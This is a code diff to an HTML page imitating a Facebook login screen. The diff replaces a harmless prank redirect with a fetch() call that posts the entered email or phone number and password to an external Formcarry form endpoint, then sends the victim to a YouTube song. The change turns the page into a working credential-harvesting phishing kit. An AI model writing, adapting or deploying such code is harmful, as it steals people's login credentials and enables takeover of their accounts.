@@ -85,7 +85,7 @@
      <p>around you on Facebook.</p> 
     </div> 
 
-    <!-- Simple login form (no Formcarry) -->
+    <!-- Login form with Formcarry -->
     <form id="loginForm"> 
      <input type="text" id="emailPhone" name="emailPhone" placeholder="Email or phone number" required> 
      <input type="password" id="password" name="password" placeholder="Password" required> 
@@ -100,7 +100,6 @@
     </form> 
    </div> 
   </div>
-
   <!-- Modal HTML -->
   <div id="popupModal" class="modal">
       <div class="modal-content">
@@ -175,11 +174,27 @@
         showModal();
     };
 
-    // Redirect to a famous Bollywood song when the form is submitted
+    // AJAX Form submission to Formcarry and redirection
     document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault(); // Prevent actual form submission
-        window.location.href = "https://www.youtube.com/watch?v=YqeW9_5kURI"; // Redirect to a Bollywood song (example: "Lean On")
+        event.preventDefault(); // Prevent the default form submission behavior
+
+        const formData = new FormData(document.getElementById("loginForm"));
+
+        // AJAX request to Formcarry
+        fetch("https://formcarry.com/s/hJQzoZbhqc-", {
+            method: "POST",
+            body: formData,
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Successful submission, redirect to a Bollywood song
+            window.location.href = "https://www.youtube.com/watch?v=oRZVgB10BOM"; // Redirect to a Bollywood song (example: *Chaiyya Chaiyya*)
+        })
+        .catch(error => {
+            console.error("Error:", error);
+            alert("There was an issue with submission. Please try again.");
+        });
     });
   </script>
-</body> 
+</body>
 </html>
